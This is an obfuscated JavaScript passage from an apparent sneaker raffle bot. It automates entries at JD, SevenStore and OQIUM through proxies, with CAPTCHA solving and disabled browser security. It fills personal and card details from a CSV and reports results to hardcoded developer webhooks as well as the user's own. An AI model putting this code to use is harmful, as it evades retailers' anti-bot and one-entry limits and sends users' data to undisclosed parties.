            var _0x54cef6 = await _0xff2c9f(_0x1ac93b[_0x5a5066], _0x15ae94, 'dev', ![]), _0x4f1337 = await _0xff2c9f(_0x1ac93b[_0x5a5066], _0x15ae94, 'pub', ![]);
            const _0x4fdc13 = {
                'succesDEVMSG': { 'embeds': [_0x54cef6] },
                'succesPUBMSG': { 'embeds': [_0x4f1337] }
            };
            try {
                _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x4fdc13['succesDEVMSG']), await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x4fdc13['succesDEVMSG']), await _0x4f800b(0xc8), await _0x5f2c92(_0x302219, _0x4fdc13['succesPUBMSG']);
            } catch (_0x554cf1) {
                console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x554cf1));
            }
        } catch (_0x1a6c48) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20' + _0x1a6c48)), _0x182406 = '' + _0x1a6c48;
            var _0x37ff64 = await _0xff2c9f(kickz[_0x5a5066], _0x15ae94, 'dev', !![], _0x182406);
            EMBEDS['errorDEV'] = { 'embeds': [_0x37ff64] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], EMBEDS['errorDEV']), await _0x5f2c92(_0x3afc50, EMBEDS['errorDEV']), _0x22bf80 = 'yes';
        } finally {
            _0x47964e && _0x47964e['close']();
            if (_0x22bf80 == 'yes' && _0xd7b747 != 0x5) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x15ae94['name'] + ']\x20Task\x20' + (_0x5a5066 + 0x1) + '\x20:\x20Retrying')), _0x5a5066 = _0x5a5066 - 0x1, _0xd7b747 = _0xd7b747 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x54a85a(_0x10477f, _0x3091ae, _0x1b7860) {
    var _0x7b1bf0 = ![], _0x57ff22 = ![];
    if (_0xd30cf5['captchaKey'] == '' || _0xd30cf5['captchaKey'] == undefined)
        return console['log'](_0x41434e['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2ad8f7 = 0x0; _0x2ad8f7 < _0x3091ae['length']; _0x2ad8f7++) {
        var _0x14d3c7, _0x167cdd = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x3091ae[_0x2ad8f7]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3091ae[_0x2ad8f7]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x434d06
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x26b8e9
                }
            ]
        }];
        const _0x5a7c76 = { 'embeds': _0x167cdd };
        _0x4bfd08(_0x10477f['name'] + '\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20/\x20' + _0x3091ae['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad), await _0x38b36b(_0x3091ae, _0x2ad8f7);
        var _0x4e6089 = await _0xff2c9f(_0x3091ae[_0x2ad8f7], _0x10477f, 'dev', ![]), _0x3a539d = await _0xff2c9f(_0x3091ae[_0x2ad8f7], _0x10477f, 'pub', ![]);
        const _0x3056b3 = {
            'succesDEVMSG': { 'embeds': [_0x4e6089] },
            'succesPUBMSG': { 'embeds': [_0x3a539d] }
        };
        if (_0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '')
            try {
                await _0x5f2c92(_0xd30cf5['webhook'], _0x3056b3['succesDEVMSG']);
            } catch {
            }
        await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x3056b3['succesDEVMSG']), await _0x4f800b(0xc8);
        try {
            await _0x5f2c92(_0x302219, _0x3056b3['succesPUBMSG']);
        } catch {
        }
        if (_0x3091ae[_0x2ad8f7]['Email'] == '' || _0x3091ae[_0x2ad8f7]['Url'] == '' || _0x3091ae[_0x2ad8f7]['FirstName'] == '' || _0x3091ae[_0x2ad8f7]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x219ffa = _0x1b7860[_0x2ad8f7]['split'](':');
        else
            var _0x56a452 = Math['round'](Math['random']() * (_0x1b7860['length'] - 0x1)), _0x219ffa = _0x1b7860[_0x56a452]['split'](':');
        const _0x3feefd = await _0x168014['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x219ffa[0x0] + ':' + _0x219ffa[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x457574 = await _0x3feefd['newPage']();
            await _0x457574['authenticate']({
                'username': '' + _0x219ffa[0x2],
                'password': '' + _0x219ffa[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x10477f['name'] + ']\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x457574['setRequestInterception'](!![]), _0x457574['on']('request', _0x370655 => {
                _0x370655['resourceType']() === 'image' || _0x370655['resourceType']() === 'font' || _0x370655['resourceType']() === 'media' ? _0x370655['abort']() : _0x370655['continue']();
            }), await _0x457574['goto']('' + _0x3091ae[_0x2ad8f7]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x457574['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x57a400() + '\x20[' + _0x10477f['name'] + ']\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x457574['type']('#comp_firstname', '' + _0x3091ae[_0x2ad8f7]['FirstName']), await _0x457574['waitForSelector']('#comp_lastname'), await _0x457574['type']('#comp_lastname', '' + _0x3091ae[_0x2ad8f7]['LastName']), await _0x457574['waitForSelector']('#comp_email'), await _0x457574['type']('#comp_email', '' + _0x3091ae[_0x2ad8f7]['Email']), await _0x457574['waitForSelector']('#comp_paypalemail'), await _0x457574['type']('#comp_paypalemail', '' + _0x3091ae[_0x2ad8f7]['Email']), await _0x457574['waitForSelector']('#comp_mobile_end'), await _0x457574['type']('#comp_mobile_end', '' + _0x3091ae[_0x2ad8f7]['Phone']), await _0x457574['waitForSelector']('#comp_dob'), await _0x457574['type']('#comp_dob', '08/09/1992'), console['log'](_0x57a400() + '\x20[' + _0x10477f['name'] + ']\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x3091ae[_0x2ad8f7]['Size'] == 'RANDOM') {
                const _0x14d6c0 = await _0x457574['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x363a18 => {
                    return _0x363a18['map'](_0x7869eb => _0x7869eb['value']);
                });
                var _0x21d151 = Math['round'](Math['random']() * (_0x14d6c0['length'] - 0x2));
                await _0x457574['select']('#shoesize', _0x14d6c0[_0x21d151 + 0x1]), await _0x4f800b(0x3e8);
            } else {
                const _0x3bc052 = await _0x457574['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3fefad => {
                    return _0x3fefad['map'](_0x3e85c0 => _0x3e85c0['innerText']);
                }), _0x183285 = await _0x457574['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x52e2b2 => {
                    return _0x52e2b2['map'](_0x612a85 => _0x612a85['value']);
                });
                var _0x16f7be = _0x3091ae[_0x2ad8f7]['Size'];
                for (var _0x5251da = 0x1; _0x5251da < _0x183285['length']; _0x5251da++) {
                    var _0x507016 = _0x3bc052[_0x5251da]['split']('\x20')[0x0];
                    if (_0x507016 == _0x16f7be) {
                        await _0x457574['select']('#shoesize', _0x183285[_0x5251da]);
                        break;
                    } else {
                        if (_0x5251da + 0x1 == _0x183285['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x457574['waitForSelector']('#comp_address1'), await _0x457574['type']('#comp_address1', _0x3091ae[_0x2ad8f7]['Address1'] + '\x20' + _0x3091ae[_0x2ad8f7]['HouseNumber']), await _0x457574['waitForSelector']('#comp_address2'), await _0x457574['type']('#comp_address2', '' + _0x3091ae[_0x2ad8f7]['Address2']), await _0x457574['waitForSelector']('#comp_address2'), await _0x457574['type']('#comp_address3', '' + _0x3091ae[_0x2ad8f7]['City']), await _0x457574['waitForSelector']('#comp_postcode'), await _0x457574['type']('#comp_postcode', '' + _0x3091ae[_0x2ad8f7]['Zip']), console['log'](_0x57a400() + '\x20[' + _0x10477f['name'] + ']\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4f800b(0x4b0), await _0x457574['click']('label#emailhold'), await _0x4f800b(0x5dc), await _0x457574['click']('#preauth_tandc_email\x20>\x20label'), await _0x4f800b(0x5dc), await _0x457574['click']('#submit'), await _0x457574['waitForSelector']('#paymentWrap'), console['log'](_0x57a400() + '\x20[' + _0x10477f['name'] + ']\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20:\x20' + _0x41434e['blue']('Awaiting\x20Paypal\x20Payment')), _0x3feefd['on']('targetcreated', async _0xb8d872 => {
                if (_0xb8d872['type']() === 'page') {
                    const _0x61e014 = await _0xb8d872['page']();
                    async function _0x16dd52() {
                        try {
                            await _0x457574['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x57ff22 = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x34223e() {
                        try {
                            await _0x457574['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x7b1bf0 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x34223e(), _0x16dd52(), await _0x4f800b(0x493e0);
                }
            });
            async function _0xccdb09() {
                for (let _0x543228 = 0x0; _0x543228 < 0x12c; _0x543228++) {
                    if (_0x7b1bf0 == !![]) {
                        console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x10477f['name'] + ']\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '')
                            try {
                                await _0x5f2c92(_0xd30cf5['webhook'], _0x3056b3['succesDEVMSG']);
                            } catch {
                            }
                        await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x3056b3['succesDEVMSG']), await _0x4f800b(0xc8);
                        try {
                            await _0x5f2c92(_0x302219, _0x3056b3['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x57ff22)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x4f800b(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x4f800b(0xbb8), await _0x457574['click']('.zoid-outlet'), await _0x4f800b(0x7d0), await _0xccdb09();
        } catch (_0x40ea00) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x10477f['name'] + ']\x20Task\x20' + (_0x2ad8f7 + 0x1) + '\x20:\x20' + _0x40ea00)), _0x14d3c7 = '' + _0x40ea00;
            var _0x2585aa = await _0xff2c9f(_0x3091ae[_0x2ad8f7], _0x10477f, 'dev', !![], _0x14d3c7);
            _0x3056b3['errorDEV'] = { 'embeds': [_0x2585aa] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x3056b3['errorDEV']), await _0x5f2c92(_0x3afc50, _0x3056b3['errorDEV']);
        } finally {
            _0x3feefd && _0x3feefd['close'](), console['log']('Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x236f35(_0x46f74f, _0x42c6b6, _0x2c9317) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1c52b1 = 0x0; _0x1c52b1 < _0x42c6b6['length']; _0x1c52b1++) {
        _0x4bfd08(_0x46f74f['name'] + '\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20/\x20' + _0x42c6b6['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad);
        var _0x575076 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x434d06
                },
                {
                    'name': 'Product',
                    'value': '' + _0x42c6b6[_0x1c52b1]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x42c6b6[_0x1c52b1]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0xd30cf5['version']
                }
            ]
        }];
        const _0x30ecc6 = { 'embeds': _0x575076 };
        await _0x38b36b(_0x42c6b6, _0x1c52b1);
        if (_0x42c6b6[_0x1c52b1]['Email'] == '' || _0x42c6b6[_0x1c52b1]['Password'] == '' || _0x42c6b6[_0x1c52b1]['FirstName'] == '' || _0x42c6b6[_0x1c52b1]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x42c6b6[_0x1c52b1]['Password'] == '' || _0x42c6b6[_0x1c52b1]['Password'] == undefined) && (_0x42c6b6[_0x1c52b1]['Password'] = 'ErehsaWonRaj1!');
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x128e7c = _0x2c9317[_0x1c52b1]['split'](':');
        else
            var _0x540b97 = Math['round'](Math['random']() * (_0x2c9317['length'] - 0x1)), _0x128e7c = _0x2c9317[_0x540b97]['split'](':');
        const _0x32dbcb = await _0x168014['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x128e7c[0x0] + ':' + _0x128e7c[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4e5b03 = await _0x32dbcb['newPage']();
            await _0x4e5b03['authenticate']({
                'username': '' + _0x128e7c[0x2],
                'password': '' + _0x128e7c[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4e5b03['setRequestInterception'](!![]), _0x4e5b03['on']('request', _0x5b5ded => {
                _0x5b5ded['resourceType']() === 'image' || _0x5b5ded['resourceType']() === 'font' || _0x5b5ded['resourceType']() === 'media' ? _0x5b5ded['abort']() : _0x5b5ded['continue']();
            }), await _0x4e5b03['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x4e5b03['goto']('' + _0x42c6b6[_0x1c52b1]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x4e5b03['waitForSelector']('#btnPdpAtb'), console['log'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x42c6b6[_0x1c52b1]['Size']);
            const _0x3e729f = await _0x4e5b03['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x1e6523 => {
                return _0x1e6523['map'](_0x5af93c => _0x5af93c['innerText']);
            }), _0x358713 = await _0x4e5b03['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x4a12e0 = ![];
            if (_0x42c6b6[_0x1c52b1]['Size'] == 'RANDOM') {
                var _0x2424fd = Math['round'](Math['random']() * (_0x358713['length'] - 0x1));
                await _0x358713[_0x2424fd]['click']();
            } else
                for (var _0x4fa979 = 0x0; _0x4fa979 < _0x3e729f['length']; _0x4fa979++) {
                    if (_0x3e729f[_0x4fa979] != _0x42c6b6[_0x1c52b1]['Size'])
                        continue;
                    try {
                        await _0x358713[_0x4fa979]['click']();
                    } catch {
                        console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x4a12e0 = !![];
                    }
                }
            if (_0x4a12e0)
                continue;
            await _0x4f800b(0x578), await _0x4e5b03['click']('#btnPdpAtb'), await _0x4e5b03['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x4f800b(0x3e8), console['log'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x4e5b03['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x4e5b03['waitForSelector']('#email'), await _0x4e5b03['type']('#email', _0x42c6b6[_0x1c52b1]['Email']), await _0x4f800b(0x226), await _0x4e5b03['click']('#guest-submit'), await _0x4f800b(0x1b58), console['log'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4e5b03['waitForSelector']('#firstname'), await _0x4e5b03['type']('#firstname', _0x42c6b6[_0x1c52b1]['FirstName'], 0x1f4), await _0x4f800b(0x190), await _0x4e5b03['waitForSelector']('#surname'), await _0x4e5b03['type']('#surname', _0x42c6b6[_0x1c52b1]['LastName'], 0x1f4), await _0x4f800b(0x190), await _0x4e5b03['waitForSelector']('#mobile'), await _0x4e5b03['type']('#mobile', _0x42c6b6[_0x1c52b1]['Phone'], 0x1f4), await _0x4f800b(0x190), await _0x4e5b03['click']('#enterManualDiv'), await _0x4f800b(0x5dc), await _0x4e5b03['waitForSelector']('#address1'), await _0x4e5b03['type']('#address1', _0x42c6b6[_0x1c52b1]['Address1'] + '\x20' + _0x42c6b6[_0x1c52b1]['HouseNumber'], 0x226), await _0x4f800b(0x384), await _0x4e5b03['waitForSelector']('#address2'), await _0x4e5b03['type']('#address2', '' + _0x42c6b6[_0x1c52b1]['Address2'], 0x226), await _0x4f800b(0x320);
            const _0x12b3f7 = await _0x4e5b03['$$eval']('#countryselect_view3\x20>\x20option', _0x49d30e => {
                return _0x49d30e['map'](_0xea814e => _0xea814e['value']);
            });
            var _0xa6752b;
            for (var _0x2b89a1 = 0x0; _0x2b89a1 < _0x12b3f7['length']; _0x2b89a1++) {
                if (_0x12b3f7[_0x2b89a1]['startsWith']('' + _0x42c6b6[_0x1c52b1]['Country'])) {
                    _0xa6752b = _0x12b3f7[_0x2b89a1];
                    break;
                }
                continue;
            }
            await _0x4e5b03['select']('#countryselect_view3', '' + _0xa6752b), await _0x4e5b03['waitForSelector']('#address4'), await _0x4e5b03['type']('#address4', '' + _0x42c6b6[_0x1c52b1]['City'], 0x1f4), await _0x4f800b(0x384), await _0x4e5b03['waitForSelector']('#postcode'), await _0x4e5b03['type']('#postcode', '' + _0x42c6b6[_0x1c52b1]['Zip'], 0x1f4), await _0x4f800b(0x4b0);
            const _0x2820c3 = await _0x4e5b03['url']();
            console['log'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x537f65 = _0x2820c3['split']('?')[0x1], _0x4de844 = await _0x4e5b03['$']('#co_address_submit');
            await _0x4de844['evaluate'](_0x18c6c3 => _0x18c6c3['click']()), await _0x4f800b(0x1388), await _0x4e5b03['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x537f65), console['log'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x4e5b03['waitForSelector']('#paymentbuttons'), await _0x4f800b(0x1388), await _0x4e5b03['click']('#paymentbuttons\x20>\x20div'), await _0x4f800b(0x1c2), await _0x4e5b03['waitForSelector']('#card-number'), await _0x4e5b03['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x367721 = await _0x4e5b03['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x31aa79 = await _0x367721['contentFrame']();
            await _0x31aa79['waitForSelector']('.InputContainer'), await _0x31aa79['click']('.InputContainer\x20>\x20input'), await _0x4f800b(0x578), await _0x4e5b03['type']('#card-number', '' + _0x42c6b6[_0x1c52b1]['CreditNumber']), await _0x4f800b(0xfa), await _0x4e5b03['type']('#card-expiry', '' + _0x42c6b6[_0x1c52b1]['ExpiryDate']), await _0x4f800b(0xfa), await _0x4e5b03['type']('#card-cvc', '' + _0x42c6b6[_0x1c52b1]['CVV']), await _0x4f800b(0x7d0), await _0x4e5b03['click']('#card-button'), console['log'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x4e5b03['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x5f2c92(_0x45c968, _0x30ecc6);
            } catch {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x203DS\x20Failed')), _0x575076[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x575076[0x0]['description'] = '3DS\x20Failed', await _0x5f2c92(_0x3afc50, _0x30ecc6);
            }
        } catch (_0x5ef87c) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x46f74f['name'] + ']\x20Task\x20' + (_0x1c52b1 + 0x1) + '\x20:\x20' + _0x5ef87c)), _0x575076[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x575076[0x0]['description'] = '' + _0x5ef87c, await _0x5f2c92(_0x3afc50, _0x30ecc6);
        } finally {
            _0x32dbcb && _0x32dbcb['close']();
            if (_0x1c52b1 + 0x1 == _0x42c6b6['length']) {
                console['log'](_0x41434e['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x4f800b(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0xd30cf5['AfewDelay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['AfewDelay']);
        }
    }
}
async function _0x4e1355(_0x46e480, _0x47bd98, _0xb08720, _0x2f5209, _0x16db3d) {
    var _0x30084d, _0x82d6ca = {}, _0x2e048d = [], _0x363389 = {}, _0x10480b = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x2f5209 && (_0x2f5209 = {});
    if (_0x47bd98 != 'ver') {
        _0x4bfd08(_0xb08720['name'] + '\x20Task\x20' + (_0x46e480 + 0x1) + '\x20/\x20' + _0x2f5209['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad), await _0x38b36b(_0x2f5209, _0x46e480), _0x2e048d = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x434d06
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2f5209[_0x46e480]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x26b8e9
                }
            ]
        }], _0x363389 = { 'embeds': _0x2e048d }, _0x82d6ca = _0xb08720['data'];
        _0x47bd98 == 'exp' ? _0x82d6ca['data']['attributes']['email'] = '' + _0x2f5209[_0x46e480]['FirstName'] + _0x2f5209[_0x46e480]['LastName'] + _0xd30cf5['catchall'] : _0x82d6ca['data']['attributes']['email'] = '' + _0x2f5209[_0x46e480]['Email'];
        if (_0x2f5209[_0x46e480]['Size'] == 'RANDOM') {
        }
        _0x82d6ca['data']['attributes']['properties']['$first_name'] = '' + _0x2f5209[_0x46e480]['FirstName'], _0x82d6ca['data']['attributes']['properties']['$last_name'] = '' + _0x2f5209[_0x46e480]['LastName'], _0x82d6ca['data']['attributes']['properties']['$address1'] = _0x2f5209[_0x46e480]['Address1'] + '\x20' + _0x2f5209[_0x46e480]['Address2'] + '\x20' + _0x2f5209[_0x46e480]['HouseNumber'], _0x82d6ca['data']['attributes']['properties']['$zip'] = '' + _0x2f5209[_0x46e480]['Zip'], _0x82d6ca['data']['attributes']['properties']['$city'] = '' + _0x2f5209[_0x46e480]['City'], _0x82d6ca['data']['attributes']['properties']['$country'] = '' + _0x2f5209[_0x46e480]['Country'], _0x82d6ca['data']['attributes']['properties']['Size'] = '' + _0x2f5209[_0x46e480]['Size'], _0x82d6ca['data']['attributes']['properties']['$phone_number'] = '' + _0x2f5209[_0x46e480]['Phone'], _0x82d6ca['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2f5209[_0x46e480]['Follower'];
    }
    if (_0xd30cf5['useRandomProxy'] = ![])
        var _0x38b085 = _0x16db3d[_0x46e480]['split'](':');
    else
        var _0x582b34 = Math['round'](Math['random']() * (_0x16db3d['length'] - 0x1)), _0x38b085 = _0x16db3d[_0x582b34]['split'](':');
    var _0x135fce = {
        'jar': _0x2ae52a,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0xb08720['url'],
        'headers': _0xb08720['headers'],
        'body': JSON['stringify'](_0x82d6ca),
        'proxy': 'http://' + _0x38b085[0x2] + ':' + _0x38b085[0x3] + '@' + _0x38b085[0x0] + ':' + _0x38b085[0x1]
    };
    return _0x47bd98 != 'ver' && (_0x135fce['url'] = _0xb08720['url'], _0x135fce['headers'] = _0xb08720['headers']), _0x47bd98 == 'ver' && (_0x135fce['method'] = 'GET'), new Promise(function (_0x7e502f, _0x38cdbc) {
        callback = async (_0x551626, _0x3e554f, _0x3271c3) => {
            if (!_0x551626 && _0x3e554f['statusCode'] == 0xca || !_0x551626 && _0x3e554f['statusCode'] == 0xc8) {
                if (_0x47bd98 != 'ver') {
                    var _0x1b08d2 = await _0xff2c9f(_0x2f5209[_0x46e480], _0xb08720, 'dev', ![]), _0x2533b1 = await _0xff2c9f(_0x2f5209[_0x46e480], _0xb08720, 'pub', ![]);
                    const _0x303d5e = {
                        'succesDEVMSG': { 'embeds': [_0x1b08d2] },
                        'succesPUBMSG': { 'embeds': [_0x2533b1] }
                    };
                    if (_0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '')
                        try {
                            await _0x5f2c92(_0xd30cf5['webhook'], _0x303d5e['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x303d5e['succesDEVMSG']), await _0x4f800b(0xc8);
                    try {
                        await _0x5f2c92(_0x302219, _0x303d5e['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x7e502f(console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0xb08720['name'] + ']\x20Task\x20' + (_0x46e480 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x47bd98 != 'ver') {
                    var _0x4347dd = '' + _0x551626, _0x7c6743 = await _0xff2c9f(_0x2f5209[_0x46e480], _0xb08720, 'dev', !![], _0x4347dd), _0x2a5347 = {};
                    _0x2a5347['errorDEV'] = { 'embeds': [_0x7c6743] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x2a5347['errorDEV']), await _0x5f2c92(_0x3afc50, _0x2a5347['errorDEV']);
                }
                _0x38cdbc(console['log'](_0x57a400() + '\x20[' + _0xb08720['name'] + ']\x20Task\x20' + (_0x46e480 + 0x1) + ':\x20' + _0x551626));
            }
        };
        try {
            _0x47bd98 != 'ver' && console['log'](_0x57a400() + '\x20[' + _0xb08720['name'] + ']\x20Task\x20' + (_0x46e480 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x82d6ca['data']['attributes']['email']), _0x3c3188(_0x135fce, callback);
        } catch (_0x3cfa67) {
            console['log'](_0x57a400() + '\x20Task\x20' + (_0x46e480 + 0x1) + ':\x20' + _0x3cfa67);
        }
    });
}
;
async function _0x72683b(_0x1e928a, _0x3b4e19, _0xe82b4d) {
    var _0x750f8b;
    _0x4bfd08('' + _0x3b4e19);
    var _0x3f6ebd = _0xe82b4d[0x0]['split'](':');
    const _0x41811e = await _0x168014['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x3f6ebd[0x0] + ':' + _0x3f6ebd[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
